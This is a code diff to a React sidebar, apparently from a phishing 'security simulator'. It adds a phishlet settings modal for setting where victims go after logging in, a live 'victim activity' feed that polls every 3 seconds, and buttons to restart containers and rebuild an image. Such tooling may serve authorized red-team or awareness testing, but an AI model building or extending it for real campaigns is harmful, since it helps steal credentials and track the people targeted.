@@ -18,12 +18,195 @@ const ITEMS = [
   { label: 'View Logs', endpoint: '/api/logs', icon: '📋' },
 ]
 
+function PhishletSettingsModal({ phishlet, onClose, onRun }) {
+  const [redirectUrl, setRedirectUrl] = useState('')
+  const [visits, setVisits] = useState([])
+  const [saving, setSaving] = useState(false)
+  const [saveStatus, setSaveStatus] = useState('')
+  const [restarting, setRestarting] = useState(false)
+  const pollRef = useRef(null)
+
+  useEffect(() => {
+    axios
+      .get(`${BASE}/api/phishlets/redirect-url?key=${encodeURIComponent(phishlet.key)}`)
+      .then((res) => setRedirectUrl(res.data.url || ''))
+      .catch(() => setRedirectUrl(''))
+  }, [phishlet.key])
+
+  useEffect(() => {
+    function fetchVisits() {
+      axios
+        .get(`${BASE}/api/phishlets/visits`, {
+          params: { key: phishlet.key, limit: 20 },
+          headers: authHeaders(),
+        })
+        .then((res) => setVisits(res.data.visits || []))
+        .catch(() => {})
+    }
+    fetchVisits()
+    pollRef.current = setInterval(fetchVisits, 3000)
+    return () => clearInterval(pollRef.current)
+  }, [phishlet.key])
+
+  function handleSave() {
+    setSaving(true)
+    setSaveStatus('')
+    axios
+      .put(
+        `${BASE}/api/phishlets/${phishlet.key}/redirect-url`,
+        { url: redirectUrl },
+        { headers: authHeaders() }
+      )
+      .then(() => {
+        setSaveStatus('Saved')
+        setTimeout(() => setSaveStatus(''), 2000)
+      })
+      .catch((err) => setSaveStatus(err.response?.data?.detail || err.message))
+      .finally(() => setSaving(false))
+  }
+
+  function handleRestart() {
+    setRestarting(true)
+    axios
+      .post(
+        `${BASE}/api/phishlets/${phishlet.key}/restart`,
+        {},
+        { headers: authHeaders() }
+      )
+      .then((res) => {
+        onRun(`Restart ${phishlet.label}`, '/api/phishlets/launch', { key: phishlet.key })
+        setSaveStatus(res.data?.message || 'Restarted')
+        setTimeout(() => setSaveStatus(''), 2000)
+      })
+      .catch((err) => setSaveStatus(err.response?.data?.detail || err.message))
+      .finally(() => setRestarting(false))
+  }
+
+  return (
+    <div
+      className="fixed inset-0 z-50 bg-black/70 flex items-center justify-center p-4"
+      onClick={onClose}
+    >
+      <div
+        className="bg-gray-900 border border-gray-700 rounded-lg w-full max-w-2xl max-h-[90vh] flex flex-col"
+        onClick={(e) => e.stopPropagation()}
+      >
+        <div className="flex items-center justify-between px-5 py-3 border-b border-gray-800">
+          <h2 className="text-sm font-bold text-yellow-300 tracking-wide">
+            {phishlet.label} Phishlet Settings
+          </h2>
+          <button
+            onClick={onClose}
+            className="text-gray-500 hover:text-red-400 text-lg leading-none"
+          >
+            ×
+          </button>
+        </div>
+
+        <div className="px-5 py-4 space-y-4 overflow-y-auto">
+          <div>
+            <label className="block text-xs text-gray-400 mb-1">
+              Redirect URL (where the victim is sent after successful login)
+            </label>
+            <div className="flex gap-2">
+              <input
+                type="text"
+                value={redirectUrl}
+                onChange={(e) => setRedirectUrl(e.target.value)}
+                placeholder="https://example.com"
+                className="flex-1 bg-gray-800 border border-gray-700 rounded px-3 py-2 text-xs text-gray-200 focus:outline-none focus:border-green-500"
+              />
+              <button
+                onClick={handleSave}
+                disabled={saving}
+                className="px-4 py-2 text-xs rounded bg-green-700 text-green-200 hover:bg-green-600 transition disabled:opacity-40"
+              >
+                {saving ? 'Saving...' : 'Save'}
+              </button>
+            </div>
+            {saveStatus && (
+              <p
+                className={`mt-1 text-[10px] ${
+                  saveStatus === 'Saved' ? 'text-green-400' : 'text-red-400'
+                }`}
+              >
+                {saveStatus}
+              </p>
+            )}
+            <p className="mt-1 text-[10px] text-gray-600">
+              Leave empty to disable the post-login redirect.
+            </p>
+          </div>
+
+          <div className="flex items-center gap-2">
+            <button
+              onClick={handleRestart}
+              disabled={restarting}
+              className="px-4 py-2 text-xs rounded bg-blue-700 text-blue-200 hover:bg-blue-600 transition disabled:opacity-40"
+            >
+              {restarting ? 'Restarting...' : `Restart ${phishlet.label} Container`}
+            </button>
+            <span className="text-[10px] text-gray-500">
+              (picks up the new addon in already-running containers)
+            </span>
+          </div>
+
+          <div>
+            <div className="flex items-center justify-between mb-2">
+              <h3 className="text-xs font-semibold text-gray-300">
+                Current victim activity
+              </h3>
+              <span className="text-[10px] text-gray-500">
+                auto-refreshes every 3s
+              </span>
+            </div>
+            <div className="border border-gray-800 rounded bg-gray-950 max-h-64 overflow-y-auto">
+              {visits.length === 0 ? (
+                <p className="px-3 py-4 text-xs text-gray-500 text-center">
+                  no activity yet
+                </p>
+              ) : (
+                <table className="w-full text-xs">
+                  <thead className="sticky top-0 bg-gray-900 border-b border-gray-800">
+                    <tr className="text-left text-gray-500">
+                      <th className="px-3 py-1.5 font-normal w-40">Time</th>
+                      <th className="px-3 py-1.5 font-normal">URL</th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    {visits.map((v, i) => (
+                      <tr
+                        key={i}
+                        className="border-b border-gray-800 last:border-0 hover:bg-gray-900"
+                      >
+                        <td className="px-3 py-1.5 text-gray-500 whitespace-nowrap">
+                          {v.timestamp
+                            ? new Date(v.timestamp).toLocaleTimeString()
+                            : '-'}
+                        </td>
+                        <td className="px-3 py-1.5 text-gray-300 break-all">
+                          {v.current_url}
+                        </td>
+                      </tr>
+                    ))}
+                  </tbody>
+                </table>
+              )}
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  )
+}
+
 export default function Sidebar({ onRun, loading, onOpenBrowser }) {
   const { user, logout } = useAuth()
   const [showPhishlets, setShowPhishlets] = useState(false)
   const [phishlets, setPhishlets] = useState([])
   const [phishletFetching, setPhishletFetching] = useState(false)
   const [phishletError, setPhishletError] = useState('')
+  const [settingsPhishlet, setSettingsPhishlet] = useState(null)
   const phishletRef = useRef(null)
 
   useEffect(() => {
@@ -72,6 +255,10 @@ export default function Sidebar({ onRun, loading, onOpenBrowser }) {
     onRun(`Remove ${label}`, `/api/containers/remove`, { name })
   }
 
+  const handleRebuildImage = () => {
+    onRun('Rebuild Firefox Image', '/api/phishlets/rebuild-image', {})
+  }
+
   return (
     <aside className="w-56 bg-gray-900 border-r border-gray-800 flex flex-col shrink-0">
       <div className="px-4 py-5 border-b border-gray-800">
@@ -81,7 +268,7 @@ export default function Sidebar({ onRun, loading, onOpenBrowser }) {
         <p className="text-[10px] text-gray-600 mt-0.5">v1.0 — security simulator</p>
       </div>
 
-      <nav className="flex-1 p-3 space-y-1">
+      <nav className="flex-1 p-3 space-y-1 overflow-y-auto">
         {ITEMS.map((item) => (
           <button
             key={item.label}
@@ -104,7 +291,7 @@ export default function Sidebar({ onRun, loading, onOpenBrowser }) {
           </button>
 
           {showPhishlets && (
-            <div className="absolute left-0 right-0 top-full mt-1 bg-gray-800 border border-gray-700 rounded-lg shadow-lg z-10 max-h-56 overflow-y-auto">
+            <div className="absolute left-0 right-0 top-full mt-1 bg-gray-800 border border-gray-700 rounded-lg shadow-lg z-10 max-h-72 overflow-y-auto">
               {phishletFetching ? (
                 <p className="px-3 py-2 text-xs text-gray-500">loading...</p>
               ) : phishletError ? (
@@ -123,10 +310,10 @@ export default function Sidebar({ onRun, loading, onOpenBrowser }) {
                       </span>
                       <span className="text-[10px] text-gray-500">:{p.port}</span>
                     </div>
-                    <div className="flex items-center gap-1.5">
+                    <div className="flex items-center gap-1.5 flex-wrap">
                       {!p.running ? (
                         <button
-                            onClick={() => handlePhishletLaunch(p.key, p.label, p.port)}
+                          onClick={() => handlePhishletLaunch(p.key, p.label, p.port)}
                           className="text-[10px] px-2 py-0.5 rounded bg-green-700 text-green-200 hover:bg-green-600 transition"
                         >
                           Launch
@@ -147,6 +334,13 @@ export default function Sidebar({ onRun, loading, onOpenBrowser }) {
                           </button>
                         </>
                       )}
+                      <button
+                        onClick={() => setSettingsPhishlet(p)}
+                        title="Settings (redirect URL + live activity)"
+                        className="text-[10px] px-2 py-0.5 rounded bg-gray-700 text-gray-200 hover:bg-gray-600 transition"
+                      >
+                        ⚙
+                      </button>
                     </div>
                   </div>
                 ))
@@ -162,6 +356,15 @@ export default function Sidebar({ onRun, loading, onOpenBrowser }) {
           <span className="text-xs">🌐</span>
           <span>Open Firefox</span>
         </button>
+
+        <button
+          onClick={handleRebuildImage}
+          disabled={loading['Rebuild Firefox Image']}
+          className="w-full flex items-center gap-3 px-3 py-2.5 rounded text-sm text-gray-400 hover:text-orange-300 hover:bg-gray-800 transition disabled:opacity-40 disabled:cursor-not-allowed"
+        >
+          <span className="text-xs">🔧</span>
+          <span>{loading['Rebuild Firefox Image'] ? 'Rebuilding Image...' : 'Rebuild Image'}</span>
+        </button>
       </nav>
 
       <div className="p-3 border-t border-gray-800 space-y-2">
@@ -170,6 +373,14 @@ export default function Sidebar({ onRun, loading, onOpenBrowser }) {
           logout
         </button>
       </div>
+
+      {settingsPhishlet && (
+        <PhishletSettingsModal
+          phishlet={settingsPhishlet}
+          onClose={() => setSettingsPhishlet(null)}
+          onRun={onRun}
+        />
+      )}
     </aside>
   )
 }
